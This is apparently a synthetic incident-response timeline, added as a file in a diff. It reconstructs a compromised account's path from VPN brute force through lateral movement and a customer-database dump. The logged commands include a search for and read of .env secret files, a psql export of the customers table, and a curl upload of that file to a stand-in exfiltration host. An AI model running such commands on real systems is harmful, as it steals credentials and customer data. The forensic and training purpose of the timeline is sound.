@@ -1,0 +1,184 @@
+R$F TIMELINE — INC-001
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+2026-10-06T22:40:00Z → 2026-10-06T23:45:00Z
+
+─── 2026-10-06 ─────────────────────────────────────────────────────────────────────────────────────
+
+22:47:00.000  AUTH
+               6x failed login for bob on VPN-01 from 203.0.113.45
+               result=FAILURE
+
+       +5m 11s
+
+22:52:11.000  AUTH
+               bob logged into VPN-01 from 203.0.113.45
+               result=SUCCESS
+
+       +1m 29s
+
+22:53:40.000  AUTH
+               bob logged into WS-02 from 10.40.0.2
+               result=SUCCESS
+
+       +4m 23s
+
+22:58:03.000  AUTH
+               bob logged into DEV-01 from 10.10.1.22
+               result=SUCCESS
+
+22:58:03.000  LOG
+               pam_unix(sshd:session): session opened for user bob(uid=1004) by (uid=0)
+
+22:58:03.000  AUTH
+               bob logged into DEV-01 from 10.10.1.22
+               result=SUCCESS
+
+       +1.0s
+
+22:58:04.000  NETWORK
+               WS-02 → 10.20.0.11:22
+
+       +1m 08s
+
+22:59:12.000  PROCESS
+               bob started find [20877] on DEV-01: find /opt -name *.env
+
+       +1m 58s
+
+23:01:10.000  AUTH
+               failed login for bob on DEV-01
+               result=FAILURE
+
+       +37s
+
+23:01:47.000  FILE
+               cat [20903] read .env
+
+23:01:47.000  PROCESS
+               bob started cat [20903] on DEV-01: cat /opt/deploy/.env
+
+       +2m 53s
+
+23:04:40.000  PROCESS
+               bob started ssh [20950] on DEV-01: ssh svc-deploy@ci-01
+
+       +1.0s
+
+23:04:41.000  AUTH
+               2x svc-deploy logged into CI-01 from 10.20.0.11
+               result=SUCCESS
+
+       +1m 24s
+
+23:06:05.000  PROCESS
+               svc-deploy started deploy.sh [9120] on CI-01: deploy.sh --target prod --skip-review
+               --extra-step db-report
+
+       +1m 57s
+
+23:08:02.000  AUTH
+               2x svc-deploy logged into APP-01 from 10.20.0.20
+               result=SUCCESS
+
+       +1m 28s
+
+23:09:30.000  PROCESS
+               svc-app started psql [8240] on APP-01: psql -h db-01 -c "COPY customers TO
+               '/tmp/export.csv' CSV"
+
+       +1.0s
+
+23:09:31.000  NETWORK
+               APP-01 → 10.30.0.10:5432
+
+       +1m 31s
+
+23:11:02.000  FILE
+               postgres create export.csv
+
+       +1m 53s
+
+23:12:55.000  AUTH
+               2x bob logged out of DEV-01
+
+       +45s
+
+23:13:40.000  PROCESS
+               svc-app started curl [8301] on APP-01: curl -T export.csv
+               https://files.exfil-test.example/upload
+
+       +21s
+
+23:14:01.200  NETWORK
+               10.10.1.21 → 10.10.0.5:53 (0.0 MB out)
+
+23:14:01.200  DNS
+               10.10.1.21 resolved intranet.raven.example → 10.40.0.5
+               result=SUCCESS
+
+23:14:01.207  NETWORK
+               10.10.1.21 → 10.40.0.5:80 (0.0 MB out)
+
+23:14:01.209  HTTP
+               10.10.1.21 GET http://intranet.raven.example/
+               result=SUCCESS
+
+23:14:01.215  HTTP
+               10.10.1.21 GET http://intranet.raven.example/news
+               result=SUCCESS
+
+23:14:02.000  NETWORK
+               10.30.0.5 → 10.10.0.5:53 (0.0 MB out)
+
+23:14:02.000  DNS
+               APP-01 resolved files.exfil-test.example → 198.51.100.23
+
+23:14:02.000  DNS
+               10.30.0.5 resolved files.exfil-test.example → 198.51.100.23
+               result=SUCCESS
+
+23:14:02.016  NETWORK
+               10.30.0.5 → 198.51.100.23:443 (0.0 MB out)
+
+23:14:02.051  TLS
+               10.30.0.5 → files.exfil-test.example:443
+
+       +1m 55s
+
+23:15:58.000  HTTP
+               APP-01 PUT https://files.exfil-test.example/upload
+
+       +32s
+
+23:16:30.000  NETWORK
+               APP-01 → 198.51.100.23:443 (48.2 MB out)
+
+       +14s
+
+23:16:44.000  HTTP
+               APP-01 GET https://files.exfil-test.example/confirm
+
+       +3m 16s
+
+23:20:00.000  ALERT
+               ALERT Unusual outbound data volume from APP-01 to a first-seen domain
+
+       +5m 12s
+
+23:25:12.000  IAM
+               dev-admin: iam.user.disable on bob
+               result=SUCCESS
+
+       +1m 48s
+
+23:27:00.000  IAM
+               dev-admin: iam.group.remove on bob
+               result=SUCCESS
+
+SUMMARY
+────────────────────────────────────────────────────────────────────────────────────────────────────
+Events                         44
+Telemetry sources              5
+Identities/assets correlated   9
+Window                         40m 00s
+First                          2026-10-06T22:47:00Z
